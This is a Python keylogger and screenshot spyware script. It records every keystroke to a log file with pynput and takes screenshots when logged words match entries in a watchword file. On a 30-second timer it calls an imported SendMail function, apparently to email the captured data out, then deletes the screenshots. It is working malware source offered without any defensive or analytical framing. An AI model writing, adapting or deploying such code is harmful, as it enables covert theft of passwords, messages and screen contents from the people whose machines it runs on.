import os
import pyscreenshot 
from time import sleep
import pynput.keyboard as keyboard
import threading
import logging
from Email import SendMail
# Path  
global path
path = 'screenshot/'

global intrevel
intrevel=30
global pressed
global imageNumber
imageNumber=0
log=""
caps=False
count=0
logging.basicConfig(filename=("Keylog.txt"),filemode='w', level= logging.DEBUG,format='%(asctime)s : %(message)s')


def grab_key(Key):
    global log,caps,count
    try:
        
        if caps:
            log=log+str(Key.char).swapcase()
        else:
            log=log+str(Key.char)
    except Exception:
        if str(Key) == 'Key.space':
            log+=" "
        elif str(Key)=='Key.shift':
            pass
        
        elif str(Key)=='Key.backspace':
            log=log[:-1]
        elif str(Key)=='Key.cap_lock':
            caps=True
            count+=1
            if count>1:
                count=0
                caps=False
        elif str(Key)=='Key.enter':
            log+='\n'
        else:
            log+="  "+str(Key)+"  "


    logging.info(log)
    print(log)
    on_click(pressed='Key.enter')
    print(log)

def takeScreenshoot(path):
    global imageNumber
    image = pyscreenshot.grab()
    file_path=path+"Screenshoot_"+str(imageNumber)+".png"
    # To save the screenshot 
    image.save(file_path)
    imageNumber+=1


def cleanDirectory(path):
    
    for file in os.listdir(path):
        os.remove(path+file)
        #print(file)
    print('File Cleaned...')


if not os.path.isdir(path):
    os.mkdir(path)



def on_click(pressed):
    global path
    if pressed:
        #grab_key(log)
        with open("workfile.txt","r") as file1:
            with open("Keylog.txt","r")as file2:
                file1_contents=file1.read()
                file2_contents=file2.read()
                common_string=set(file1_contents.split())&set(file2_contents.split())
                if common_string:
                    takeScreenshoot(path)
                    print('ScreenShoot Taken')
                else:
                    print('string is not matched')


def report1():
    global path,intrevel
    SendMail()
    print('Mail Sent')
    cleanDirectory(path)
    timer = threading.Timer(intrevel, report1)
    timer.start()

def run():
    listener=keyboard.Listener(on_press=grab_key)
    with listener:
        report1()
        listener.join()
    

run()
